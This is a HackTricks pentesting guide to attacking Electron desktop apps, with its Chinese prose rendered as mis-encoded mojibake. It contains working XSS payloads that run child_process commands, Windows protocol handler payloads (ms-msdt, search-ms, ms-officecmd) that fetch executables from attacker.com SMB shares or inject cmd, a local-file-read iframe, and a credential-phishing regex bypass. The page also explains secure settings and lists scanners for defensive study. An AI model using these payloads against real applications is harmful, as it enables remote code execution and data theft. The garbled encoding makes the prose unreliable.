# Electronæ¡Œé¢åº”ç”¨ç¨‹åº

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

- å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
- è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
- æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
- **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
- é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## ç®€ä»‹

Electronç»“åˆäº†æœ¬åœ°åç«¯ï¼ˆä½¿ç”¨**NodeJS**ï¼‰å’Œå‰ç«¯ï¼ˆ**Chromium**ï¼‰ï¼Œå°½ç®¡å®ƒç¼ºå°‘ä¸€äº›ç°ä»£æµè§ˆå™¨çš„å®‰å…¨æœºåˆ¶ã€‚

é€šå¸¸ï¼Œæ‚¨å¯èƒ½ä¼šåœ¨`.asar`åº”ç”¨ç¨‹åºä¸­æ‰¾åˆ°Electronåº”ç”¨ç¨‹åºä»£ç ï¼Œä¸ºäº†è·å–ä»£ç ï¼Œæ‚¨éœ€è¦æå–å®ƒï¼š
```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```
åœ¨ Electron åº”ç”¨çš„æºä»£ç ä¸­ï¼Œåœ¨ `packet.json` æ–‡ä»¶ä¸­ï¼Œä½ å¯ä»¥æ‰¾åˆ°æŒ‡å®šäº†å®‰å…¨é…ç½®çš„ `main.js` æ–‡ä»¶ã€‚
```json
{
"name": "standard-notes",
"main": "./app/index.js",
```
Electronæœ‰2ç§è¿›ç¨‹ç±»å‹ï¼š

* ä¸»è¿›ç¨‹ï¼ˆå®Œå…¨è®¿é—®NodeJSï¼‰
* æ¸²æŸ“è¿›ç¨‹ï¼ˆå‡ºäºå®‰å…¨åŸå› ï¼Œåº”é™åˆ¶NodeJSè®¿é—®æƒé™ï¼‰

![](<../../../.gitbook/assets/image (307) (5) (1).png>)

ä¸€ä¸ª**æ¸²æŸ“è¿›ç¨‹**å°†æ˜¯åŠ è½½æ–‡ä»¶çš„æµè§ˆå™¨çª—å£ï¼š
```javascript
const {BrowserWindow} = require('electron');
let win = new BrowserWindow();

//Open Renderer Process
win.loadURL(`file://path/to/index.html`);
```
**æ¸²æŸ“è¿›ç¨‹**çš„è®¾ç½®å¯ä»¥åœ¨main.jsæ–‡ä»¶ä¸­çš„**ä¸»è¿›ç¨‹**ä¸­è¿›è¡Œ**é…ç½®**ã€‚å¦‚æœ**è®¾ç½®æ­£ç¡®é…ç½®**ï¼Œä¸€äº›é…ç½®å°†**é˜²æ­¢Electronåº”ç”¨ç¨‹åºå—åˆ°RCE**æˆ–å…¶ä»–æ¼æ´çš„å½±å“ã€‚

å°½ç®¡å¯ä»¥é…ç½®Electronåº”ç”¨ç¨‹åºä»¥é˜²æ­¢å…¶è®¿é—®è®¾å¤‡ï¼Œä½†å®ƒå¯ä»¥é€šè¿‡Node APIè®¿é—®ï¼š

- **`nodeIntegration`** - é»˜è®¤ä¸º`off`ã€‚å¦‚æœæ‰“å¼€ï¼Œå…è®¸ä»æ¸²æŸ“è¿›ç¨‹è®¿é—®NodeåŠŸèƒ½ã€‚
- **`contextIsolation`** - é»˜è®¤ä¸º`on`ã€‚å¦‚æœæ‰“å¼€ï¼Œä¸»è¿›ç¨‹å’Œæ¸²æŸ“è¿›ç¨‹ä¸è¢«éš”ç¦»ã€‚
- **`preload`** - é»˜è®¤ä¸ºç©ºã€‚
- [**`sandbox`**](https://docs.w3cub.com/electron/api/sandbox-option) - é»˜è®¤ä¸ºå…³é—­ã€‚å®ƒå°†é™åˆ¶NodeJSå¯ä»¥æ‰§è¡Œçš„æ“ä½œã€‚
- Workersä¸­çš„Nodeé›†æˆ
- **`nodeIntegrationInSubframes`** - é»˜è®¤ä¸º`off`ã€‚
- å¦‚æœå¯ç”¨äº†**`nodeIntegration`**ï¼Œåˆ™å…è®¸åœ¨Electronåº”ç”¨ç¨‹åºä¸­çš„**åŠ è½½åœ¨iframesä¸­çš„ç½‘é¡µ**ä¸­ä½¿ç”¨**Node.js API**ã€‚
- å¦‚æœ**`nodeIntegration`**è¢«**ç¦ç”¨**ï¼Œåˆ™preloadå°†åœ¨iframeä¸­åŠ è½½

é…ç½®ç¤ºä¾‹ï¼š
```javascript
const mainWindowOptions = {
title: 'Discord',
backgroundColor: getBackgroundColor(),
width: DEFAULT_WIDTH,
height: DEFAULT_HEIGHT,
minWidth: MIN_WIDTH,
minHeight: MIN_HEIGHT,
transparent: false,
frame: false,
resizable: true,
show: isVisible,
webPreferences: {
blinkFeatures: 'EnumerateDevices,AudioOutputDevices',
nodeIntegration: false,
contextIsolation: false,
sandbox: false,
nodeIntegrationInSubFrames: false,
preload: _path2.default.join(__dirname, 'mainScreenPreload.js'),
nativeWindowOpen: true,
enableRemoteModule: false,
spellcheck: true
}
};
```
ä¸€äº›**RCEè´Ÿè½½**æ¥è‡ª[è¿™é‡Œ](https://7as.es/electron/nodeIntegration\_rce.txt)ï¼š
```html
Example Payloads (Windows):
<img src=x onerror="alert(require('child_process').execSync('calc').toString());">

Example Payloads (Linux & MacOS):
<img src=x onerror="alert(require('child_process').execSync('gnome-calculator').toString());">
<img src=x onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());">
<img src=x onerror="alert(require('child_process').execSync('id').toString());">
<img src=x onerror="alert(require('child_process').execSync('ls -l').toString());">
<img src=x onerror="alert(require('child_process').execSync('uname -a').toString());">
```
### æ•è·æµé‡

ä¿®æ”¹`start-main`é…ç½®å¹¶æ·»åŠ ä½¿ç”¨ä»£ç†ï¼Œä¾‹å¦‚ï¼š
```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```
## Electron æœ¬åœ°ä»£ç æ³¨å…¥

å¦‚æœæ‚¨å¯ä»¥åœ¨æœ¬åœ°æ‰§è¡Œ Electron åº”ç”¨ç¨‹åºï¼Œé‚£ä¹ˆå¯èƒ½å¯ä»¥ä½¿å…¶æ‰§è¡Œä»»æ„çš„ JavaScript ä»£ç ã€‚æŸ¥çœ‹æ–¹æ³•ï¼š

{% content-ref url="../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md" %}
[macos-electron-applications-injection.md](../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md)
{% endcontent-ref %}

## RCE: XSS + nodeIntegration

å¦‚æœ **nodeIntegration** è®¾ç½®ä¸º **on**ï¼Œç½‘é¡µçš„ JavaScript å¯ä»¥è½»æ¾ä½¿ç”¨ Node.js åŠŸèƒ½ï¼Œåªéœ€è°ƒç”¨ `require()`ã€‚ä¾‹å¦‚ï¼Œåœ¨ Windows ä¸Šæ‰§è¡Œè®¡ç®—å™¨åº”ç”¨ç¨‹åºçš„æ–¹æ³•æ˜¯ï¼š
```html
<script>
require('child_process').exec('calc');
// or
top.require('child_process').exec('open /System/Applications/Calculator.app');
</script>
```
<figure><img src="../../../.gitbook/assets/image (5) (4).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

åœ¨è¿™ä¸ªè®¾ç½®ä¸­æŒ‡å®šçš„è„šæœ¬æ˜¯åœ¨æ¸²æŸ“å™¨ä¸­çš„å…¶ä»–è„šæœ¬ä¹‹å‰**åŠ è½½çš„**ï¼Œå› æ­¤å®ƒå…·æœ‰**å¯¹Node APIçš„æ— é™è®¿é—®æƒé™**ï¼š
```javascript
new BrowserWindow{
webPreferences: {
nodeIntegration: false,
preload: _path2.default.join(__dirname, 'perload.js'),
}
});
```
å› æ­¤ï¼Œè„šæœ¬å¯ä»¥å°†èŠ‚ç‚¹åŠŸèƒ½å¯¼å‡ºåˆ°é¡µé¢ï¼š

{% code title="preload.js" %}
```javascript
typeof require === 'function';
window.runCalc = function(){
require('child_process').exec('calc')
};
```
{% endcode %}

{% code title="index.html" %}
```html
<body>
<script>
typeof require === 'undefined';
runCalc();
</script>
</body>
```
{% endcode %}

{% hint style="info" %}
**å¦‚æœ`contextIsolation`è¢«å¯ç”¨ï¼Œè¿™å°†æ— æ³•å·¥ä½œ**
{% endhint %}

## RCE: XSS + contextIsolation

_**contextIsolation**_å¼•å…¥äº†**ç½‘é¡µè„šæœ¬å’ŒJavaScript Electronå†…éƒ¨ä»£ç ä¹‹é—´çš„åˆ†ç¦»ä¸Šä¸‹æ–‡**ï¼Œä½¿å¾—æ¯ä¸ªä»£ç çš„JavaScriptæ‰§è¡Œä¸ä¼šç›¸äº’å½±å“ã€‚è¿™æ˜¯ä¸€ä¸ªå¿…è¦çš„åŠŸèƒ½ï¼Œä»¥æ¶ˆé™¤RCEçš„å¯èƒ½æ€§ã€‚

å¦‚æœä¸Šä¸‹æ–‡æ²¡æœ‰è¢«éš”ç¦»ï¼Œæ”»å‡»è€…å¯ä»¥ï¼š

1. åœ¨æ¸²æŸ“å™¨ä¸­æ‰§è¡Œ**ä»»æ„JavaScript**ï¼ˆXSSæˆ–å¯¼èˆªåˆ°å¤–éƒ¨ç«™ç‚¹ï¼‰
2. **è¦†ç›–**åœ¨preloadæˆ–Electronå†…éƒ¨ä»£ç ä¸­ä½¿ç”¨çš„å†…ç½®æ–¹æ³•ä¸ºè‡ªå·±çš„å‡½æ•°
3. **è§¦å‘**ä½¿ç”¨**è¢«è¦†ç›–çš„å‡½æ•°**
4. RCEï¼Ÿ

æœ‰ä¸¤ä¸ªåœ°æ–¹å¯ä»¥è¦†ç›–å†…ç½®æ–¹æ³•ï¼šåœ¨preloadä»£ç ä¸­æˆ–åœ¨Electronå†…éƒ¨ä»£ç ä¸­ï¼š

{% content-ref url="electron-contextisolation-rce-via-preload-code.md" %}
[electron-contextisolation-rce-via-preload-code.md](electron-contextisolation-rce-via-preload-code.md)
{% endcontent-ref %}

{% content-ref url="electron-contextisolation-rce-via-electron-internal-code.md" %}
[electron-contextisolation-rce-via-electron-internal-code.md](electron-contextisolation-rce-via-electron-internal-code.md)
{% endcontent-ref %}

{% content-ref url="electron-contextisolation-rce-via-ipc.md" %}
[electron-contextisolation-rce-via-ipc.md](electron-contextisolation-rce-via-ipc.md)
{% endcontent-ref %}

### ç»•è¿‡ç‚¹å‡»äº‹ä»¶

å¦‚æœåœ¨å•å‡»é“¾æ¥æ—¶åº”ç”¨äº†é™åˆ¶ï¼Œæ‚¨å¯èƒ½å¯ä»¥é€šè¿‡**ä¸­é”®å•å‡»**è€Œä¸æ˜¯å¸¸è§„å·¦é”®å•å‡»æ¥ç»•è¿‡å®ƒä»¬
```javascript
window.addEventListener('click', (e) => {
```
## é€šè¿‡ shell.openExternal å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰

æœ‰å…³æ­¤ç¤ºä¾‹çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹[https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8)å’Œ[https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)

åœ¨éƒ¨ç½² Electron æ¡Œé¢åº”ç”¨ç¨‹åºæ—¶ï¼Œç¡®ä¿ `nodeIntegration` å’Œ `contextIsolation` çš„æ­£ç¡®è®¾ç½®è‡³å…³é‡è¦ã€‚å·²ç»ç¡®å®šï¼Œé€šè¿‡è®¾ç½®è¿™äº›è®¾ç½®ï¼Œå¯ä»¥æœ‰æ•ˆé˜²æ­¢é’ˆå¯¹é¢„åŠ è½½è„šæœ¬æˆ– Electron ä¸»è¿›ç¨‹çš„**å®¢æˆ·ç«¯è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰**ã€‚

ç”¨æˆ·ä¸é“¾æ¥äº¤äº’æˆ–æ‰“å¼€æ–°çª—å£æ—¶ï¼Œä¼šè§¦å‘ç‰¹å®šçš„äº‹ä»¶ä¾¦å¬å™¨ï¼Œè¿™å¯¹åº”ç”¨ç¨‹åºçš„å®‰å…¨æ€§å’ŒåŠŸèƒ½è‡³å…³é‡è¦ï¼š
```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```
è¿™äº›ç›‘å¬å™¨è¢«æ¡Œé¢åº”ç”¨ç¨‹åº**è¦†ç›–**ï¼Œä»¥å®ç°å…¶è‡ªå·±çš„**ä¸šåŠ¡é€»è¾‘**ã€‚è¯¥åº”ç”¨ç¨‹åºè¯„ä¼°å¯¼èˆªé“¾æ¥åº”åœ¨å†…éƒ¨æ‰“å¼€è¿˜æ˜¯åœ¨å¤–éƒ¨Webæµè§ˆå™¨ä¸­æ‰“å¼€ã€‚é€šå¸¸é€šè¿‡ä¸€ä¸ªåä¸º `openInternally` çš„å‡½æ•°æ¥åšå‡ºå†³å®šã€‚å¦‚æœè¯¥å‡½æ•°è¿”å› `false`ï¼Œåˆ™è¡¨ç¤ºåº”åœ¨å¤–éƒ¨æ‰“å¼€é“¾æ¥ï¼Œåˆ©ç”¨ `shell.openExternal` å‡½æ•°ã€‚

**ä»¥ä¸‹æ˜¯ç®€åŒ–çš„ä¼ªä»£ç :**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../../.gitbook/assets/image (638) (2) (1) (1).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../../.gitbook/assets/image (620).png>)

Electron JS å®‰å…¨æœ€ä½³å®è·µå»ºè®®ä¸è¦ä½¿ç”¨ `openExternal` å‡½æ•°æ¥å—ä¸å—ä¿¡ä»»çš„å†…å®¹ï¼Œå› ä¸ºè¿™å¯èƒ½é€šè¿‡å„ç§åè®®å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰ã€‚æ“ä½œç³»ç»Ÿæ”¯æŒå¯èƒ½è§¦å‘ RCE çš„ä¸åŒåè®®ã€‚æœ‰å…³æ­¤ä¸»é¢˜çš„è¯¦ç»†ç¤ºä¾‹å’Œè¿›ä¸€æ­¥è§£é‡Šï¼Œå¯ä»¥å‚è€ƒ[æ­¤èµ„æº](https://positive.security/blog/url-open-rce#windows-10-19042)ï¼Œå…¶ä¸­åŒ…æ‹¬èƒ½å¤Ÿåˆ©ç”¨æ­¤æ¼æ´çš„ Windows åè®®ç¤ºä¾‹ã€‚

**Windows åè®®åˆ©ç”¨ç¤ºä¾‹åŒ…æ‹¬:**
```html
<script>
window.open("ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22")
</script>

<script>
window.open("search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update")
</script>

<script>
window.open("ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D")
</script>
```
## è¯»å–å†…éƒ¨æ–‡ä»¶ï¼šXSS + contextIsolation

**ç¦ç”¨ `contextIsolation` å¯ä»¥å¯ç”¨ `<webview>` æ ‡ç­¾**ï¼Œç±»ä¼¼äº `<iframe>`ï¼Œç”¨äºè¯»å–å’Œå¤–æ³„æœ¬åœ°æ–‡ä»¶ã€‚æä¾›çš„ç¤ºä¾‹æ¼”ç¤ºäº†å¦‚ä½•åˆ©ç”¨æ­¤æ¼æ´è¯»å–å†…éƒ¨æ–‡ä»¶çš„å†…å®¹ï¼š

![](../../../.gitbook/assets/1-u1jdryuwaevwjmf_f2ttjg.png)

æ­¤å¤–ï¼Œè¿˜åˆ†äº«äº†å¦ä¸€ç§**è¯»å–å†…éƒ¨æ–‡ä»¶**çš„æ–¹æ³•ï¼Œçªå‡ºäº† Electron æ¡Œé¢åº”ç”¨ç¨‹åºä¸­çš„å…³é”®æœ¬åœ°æ–‡ä»¶è¯»å–æ¼æ´ã€‚è¿™æ¶‰åŠæ³¨å…¥è„šæœ¬ä»¥åˆ©ç”¨åº”ç”¨ç¨‹åºå¹¶å¤–æ³„æ•°æ®ï¼š
```html
<br><BR><BR><BR>
<h1>pwn<br>
<iframe onload=j() src="/etc/hosts">xssxsxxsxs</iframe>
<script type="text/javascript">
function j(){alert('pwned contents of /etc/hosts :\n\n '+frames[0].document.body.innerText)}
</script>
```
## **RCE: XSS + æ—§ç‰ˆ Chromium**

å¦‚æœåº”ç”¨ç¨‹åºä½¿ç”¨çš„ **Chromium** ç‰ˆæœ¬è¾ƒæ—§ï¼Œå¹¶ä¸”å·²çŸ¥å­˜åœ¨ **æ¼æ´**ï¼Œåˆ™å¯èƒ½å¯ä»¥é€šè¿‡ **XSS** åˆ©ç”¨å®ƒå¹¶è·å¾— RCEã€‚\
æ‚¨å¯ä»¥åœ¨è¿™ä¸ª **writeup** ä¸­çœ‹åˆ°ä¸€ä¸ªç¤ºä¾‹ï¼š[https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)

## **é€šè¿‡å†…éƒ¨ URL æ­£åˆ™è¡¨è¾¾å¼ç»•è¿‡è¿›è¡Œ XSS é’“é±¼**

å‡è®¾æ‚¨å‘ç°äº†ä¸€ä¸ª XSSï¼Œä½†æ˜¯ **æ— æ³•è§¦å‘ RCE æˆ–çªƒå–å†…éƒ¨æ–‡ä»¶**ï¼Œæ‚¨å¯ä»¥å°è¯•ä½¿ç”¨å®ƒæ¥é€šè¿‡é’“é±¼ **çªƒå–å‡­æ®**ã€‚

é¦–å…ˆï¼Œæ‚¨éœ€è¦äº†è§£å½“å°è¯•æ‰“å¼€æ–° URL æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆï¼Œæ£€æŸ¥å‰ç«¯çš„ JS ä»£ç ï¼š
```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```
è°ƒç”¨**`openInternally`**å°†å†³å®šå°†é“¾æ¥åœ¨æ¡Œé¢çª—å£ä¸­æ‰“å¼€ï¼Œå› ä¸ºå®ƒæ˜¯å±äºå¹³å°çš„é“¾æ¥ï¼Œ**æˆ–è€…**å°†åœ¨æµè§ˆå™¨ä¸­ä½œä¸ºç¬¬ä¸‰æ–¹èµ„æºæ‰“å¼€ã€‚

å¦‚æœå‡½æ•°ä½¿ç”¨çš„**æ­£åˆ™è¡¨è¾¾å¼**å®¹æ˜“è¢«ç»•è¿‡ï¼ˆä¾‹å¦‚**æœªè½¬ä¹‰å­åŸŸçš„ç‚¹**ï¼‰ï¼Œæ”»å‡»è€…å¯ä»¥æ»¥ç”¨XSSæ¥**æ‰“å¼€ä¸€ä¸ªæ–°çª—å£**ï¼Œè¯¥çª—å£ä½äºæ”»å‡»è€…çš„åŸºç¡€è®¾æ–½ä¸­ï¼Œ**è¦æ±‚ç”¨æˆ·æä¾›å‡­æ®**ï¼š
```html
<script>
window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```
## **å·¥å…·**

* [**Electronegativity**](https://github.com/doyensec/electronegativity) æ˜¯ä¸€ä¸ªç”¨äºè¯†åˆ« Electron åº”ç”¨ç¨‹åºä¸­çš„é…ç½®é”™è¯¯å’Œå®‰å…¨åæ¨¡å¼çš„å·¥å…·ã€‚
* [**Electrolint**](https://github.com/ksdmitrieva/electrolint) æ˜¯ä¸€ä¸ªå¼€æºçš„ VS Code æ’ä»¶ï¼Œç”¨äº Electron åº”ç”¨ç¨‹åºï¼Œä½¿ç”¨ Electronegativityã€‚
* [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) ç”¨äºæ£€æŸ¥ç¬¬ä¸‰æ–¹åº“æ˜¯å¦å­˜åœ¨æ¼æ´ã€‚
* [**Electro.ng**](https://electro.ng/)ï¼šéœ€è¦è´­ä¹°ã€‚

## å®éªŒå®¤

åœ¨ [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s) ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªç”¨äºåˆ©ç”¨æ˜“å—æ”»å‡»çš„ Electron åº”ç”¨ç¨‹åºçš„å®éªŒå®¤ã€‚

ä¸€äº›å‘½ä»¤å¯ä»¥å¸®åŠ©æ‚¨å®Œæˆå®éªŒå®¤ï¼š
```bash
# Download apps from these URls
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vuln to IPC Rce
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```
## **å‚è€ƒèµ„æ–™**

* [https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
* [https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
* [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
* [https://www.youtube.com/watch?v=a-YnG3Mx-Tg](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
* [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s)
* æ›´å¤šå…³äºElectronå®‰å…¨æ€§çš„ç ”ç©¶å’Œæ–‡ç« è¯·å‚è€ƒ[https://github.com/doyensec/awesome-electronjs-hacking](https://github.com/doyensec/awesome-electronjs-hacking)
* [https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81](https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½PDFç‰ˆæœ¬çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[NFTsæ”¶è—å“](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚ 

</details>
